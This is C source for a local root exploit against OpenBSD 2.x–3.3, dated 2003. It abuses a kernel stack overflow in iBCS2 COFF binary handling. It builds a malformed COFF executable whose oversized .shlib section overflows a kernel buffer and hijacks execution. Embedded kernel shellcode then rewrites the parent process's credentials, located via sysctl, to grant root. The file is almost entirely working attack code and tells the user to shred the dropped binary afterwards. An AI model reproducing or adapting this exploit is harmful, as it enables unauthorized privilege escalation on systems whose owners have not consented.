/** OpenBSD 2.x - 3.3                                            **/
/** exec_ibcs2_coff_prep_zmagic() kernel stack overflow          **/ 
/** note: ibcs2 binary compatibility with SCO and ISC is enabled **/
/** in the default install                                       **/

/**     Copyright Feb 26 2003 Sinan "noir" Eren                  **/ 
/**     noir@olympos.org | noir@uberhax0r.net                    **/

#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sys/signal.h>

/* kernel_sc.s shellcode */

unsigned char shellcode[] =
"\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe"
"\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89"
"\x42\x04\x8b\x51\x14\x89\x42\x0c\x8d\x6c\x24\x68\x0f\x01\x4f\x04\x8b"
"\x5f\x06\x8b\x93\x00\x04\x00\x00\x8b\x8b\x04\x04\x00\x00\xc1\xe9\x10"
"\xc1\xe1\x10\xc1\xe2\x10\xc1\xea\x10\x09\xca\x31\xc9\x41\x8a\x1c\x0a"
"\x80\xfb\xe8\x75\xf7\x8d\x1c\x0a\x41\x8b\x0c\x0a\x83\xc1\x05\x01\xd9"
"\x89\xcf\xb0\xff\xfc\xb9\xff\xff\xff\xff\xf2\xae\x8a\x1f\x80\xfb\xd0"
"\x75\xef\x47\x31\xc0\x57\xc3";

/* iret_sc.s */

unsigned char iret_shellcode[] =
"\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe"
"\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89"
"\x42\x04\x8b\x51\x14\x89\x42\x0c\xfa\x6a\x1f\x07\x6a\x1f\x1f\x6a\x00"
"\x5f\x6a\x00\x5e\x68\x00\xd0\xbf\xdf\x5d\x6a\x00\x5b\x6a\x00\x5a\x6a"
"\x00\x59\x6a\x00\x58\x6a\x1f\x68\x00\xd0\xbf\xdf\x68\x87\x02\x00\x00"
"\x6a\x17";

unsigned char pusheip[] =
"\x68\x00\x00\x00\x00"; /* fill eip */

unsigned char iret[] =
"\xcf";

unsigned char exitsh[] =
"\x31\xc0\xcd\x80\xcc"; /* xorl %eax,%eax, int $0x80, int3 */


#define ZERO(p) memset(&p, 0x00, sizeof(p))

/*
 * COFF file header
 */

struct coff_filehdr {
    u_short     f_magic;        /* magic number */
    u_short     f_nscns;        /* # of sections */
    long        f_timdat;       /* timestamp */
    long        f_symptr;       /* file offset of symbol table */
    long        f_nsyms;        /* # of symbol table entries */
    u_short     f_opthdr;       /* size of optional header */
    u_short     f_flags;        /* flags */
};

/* f_magic flags */
#define COFF_MAGIC_I386 0x14c

/* f_flags */
#define COFF_F_RELFLG   0x1
#define COFF_F_EXEC     0x2
#define COFF_F_LNNO     0x4
#define COFF_F_LSYMS    0x8
#define COFF_F_SWABD    0x40
#define COFF_F_AR16WR   0x80
#define COFF_F_AR32WR   0x100

/*
 * COFF system header
 */

struct coff_aouthdr {
    short       a_magic;
    short       a_vstamp;
    long        a_tsize;
    long        a_dsize;
    long        a_bsize;
    long        a_entry;
    long        a_tstart;
    long        a_dstart;
};

/* magic */
#define COFF_ZMAGIC     0413

/*
 * COFF section header
 */

struct coff_scnhdr {
    char        s_name[8];
    long        s_paddr;
    long        s_vaddr;
    long        s_size;
    long        s_scnptr;
    long        s_relptr;
    long        s_lnnoptr;
    u_short     s_nreloc;
    u_short     s_nlnno;
    long        s_flags;
};

/* s_flags */
#define COFF_STYP_TEXT          0x20
#define COFF_STYP_DATA          0x40
#define COFF_STYP_SHLIB         0x800


void get_proc(pid_t, struct kinfo_proc *);
void sig_handler();

int
main(int argc, char **argv)
{
  u_int i, fd, debug = 0;
  u_char *ptr, *shptr;
  u_long *lptr;
  u_long pprocadr, offset;
  struct kinfo_proc kp;
  char *args[] = { "./ibcs2own", NULL};
  char *envs[] = { "RIP=theo", NULL};
  //COFF structures
  struct coff_filehdr fhdr;
  struct coff_aouthdr ahdr;
  struct coff_scnhdr  scn0, scn1, scn2;

   if(argv[1]) {
      if(!strncmp(argv[1], "-v", 2)) 
              debug = 1;
      else { 
              printf("-v: verbose flag only\n");
              exit(0);
            }
    }
 
    ZERO(fhdr);
    fhdr.f_magic = COFF_MAGIC_I386;
    fhdr.f_nscns = 3; //TEXT, DATA, SHLIB
    fhdr.f_timdat = 0xdeadbeef;
    fhdr.f_symptr = 0x4000;
    fhdr.f_nsyms = 1;
    fhdr.f_opthdr = sizeof(ahdr); //AOUT opt header size
    fhdr.f_flags = COFF_F_EXEC;

    ZERO(ahdr);
    ahdr.a_magic = COFF_ZMAGIC;
    ahdr.a_tsize = 0;
    ahdr.a_dsize = 0; 
    ahdr.a_bsize = 0;
    ahdr.a_entry = 0x10000;
    ahdr.a_tstart = 0;
    ahdr.a_dstart = 0;
   
    ZERO(scn0);
    memcpy(&scn0.s_name, ".text", 5);
    scn0.s_paddr = 0x10000;
    scn0.s_vaddr = 0x10000;
    scn0.s_size = 4096;
    scn0.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3); 
    //file offset of .text segment
    scn0.s_relptr = 0;
    scn0.s_lnnoptr = 0;
    scn0.s_nreloc = 0;
    scn0.s_nlnno = 0;
    scn0.s_flags = COFF_STYP_TEXT;

    ZERO(scn1);
    memcpy(&scn1.s_name, ".data", 5);
    scn1.s_paddr = 0x10000 - 4096;
    scn1.s_vaddr = 0x10000 - 4096;
    scn1.s_size = 4096;
    scn1.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 4096; 
    //file offset of .data segment
    scn1.s_relptr = 0;
    scn1.s_lnnoptr = 0;
    scn1.s_nreloc = 0;
    scn1.s_nlnno = 0;
    scn1.s_flags = COFF_STYP_DATA;

    ZERO(scn2);
    memcpy(&scn2.s_name, ".shlib", 6);
    scn2.s_paddr = 0;
    scn2.s_vaddr = 0;
    scn2.s_size = 0xb0; //HERE IS DA OVF!!! static_buffer = 128
    scn2.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 2*4096; 
    //file offset of .data segment
    scn2.s_relptr = 0;
    scn2.s_lnnoptr = 0;
    scn2.s_nreloc = 0;
    scn2.s_nlnno = 0;
    scn2.s_flags = COFF_STYP_SHLIB;

    offset = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 3*4096;
    ptr = (char *) malloc(offset);
    if(!ptr) { 
                perror("malloc");
                exit(-1);
    }

    memset(ptr, 0xcc, offset);  /* fill int3 */

    /* copy sections */
    offset = 0;
    memcpy(ptr, (char *) &fhdr, sizeof(fhdr));
    offset += sizeof(fhdr);

    memcpy(ptr+offset, (char *) &ahdr, sizeof(ahdr)); 
    offset += sizeof(ahdr);
        
    memcpy(ptr+offset, (char *) &scn0, sizeof(scn0));
    offset += sizeof(scn0);

    memcpy(ptr+offset, &scn1, sizeof(scn1));
    offset += sizeof(scn1);

    memcpy(ptr+offset, (char *) &scn2, sizeof(scn2));
    offset += sizeof(scn2);

    lptr = (u_long *) ((char *)ptr + sizeof(fhdr) + sizeof(ahdr) + \
           (sizeof(scn0) * 3) + 4096 + 4096 + 0xb0 - 8);

    shptr = (char *) malloc(4096);
    if(!shptr) {
                perror("malloc");
                exit(-1);
    }
    if(debug)
      printf("payload adr: 0x%.8x\t", shptr);

    memset(shptr, 0xcc, 4096);

    get_proc((pid_t) getppid(), &kp);
    pprocadr = (u_long) kp.kp_eproc.e_paddr;
    if(debug)
      printf("parent proc adr: 0x%.8x\n", pprocadr); 

    *lptr++ = 0xdeadbeef;
    *lptr = (u_long) shptr;

    shellcode[5] = pprocadr & 0xff;
    shellcode[6] = (pprocadr >> 8) & 0xff;
    shellcode[7] = (pprocadr >> 16) & 0xff;
    shellcode[8] = (pprocadr >> 24) & 0xff;

    memcpy(shptr, shellcode, sizeof(shellcode)-1);

    unlink("./ibcs2own");
    if((fd = open("./ibcs2own", O_CREAT^O_RDWR, 0755)) < 0) {
                perror("open");
                exit(-1);
        }

    write(fd, ptr, sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0) * 3) + 4096*3);
    close(fd);
    free(ptr);

    signal(SIGSEGV, (void (*)())sig_handler);
    signal(SIGILL, (void (*)())sig_handler);
    signal(SIGSYS, (void (*)())sig_handler);
    signal(SIGBUS, (void (*)())sig_handler);
    signal(SIGABRT, (void (*)())sig_handler);
    signal(SIGTRAP, (void (*)())sig_handler);

    printf("\nDO NOT FORGET TO SHRED ./ibcs2own\n");
    execve(args[0], args, envs);
    perror("execve");
}

void
sig_handler()
{
   _exit(0);
}

void
get_proc(pid_t pid, struct kinfo_proc *kp)
{
   u_int arr[4], len;

        arr[0] = CTL_KERN;
        arr[1] = KERN_PROC;
        arr[2] = KERN_PROC_PID;
        arr[3] = pid;
        len = sizeof(struct kinfo_proc);
        if(sysctl(arr, 4, kp, &len, NULL, 0) < 0) {
                perror("sysctl");
                fprintf(stderr, "this is an unexpected error, re-run!\n");
                exit(-1);
        }

}
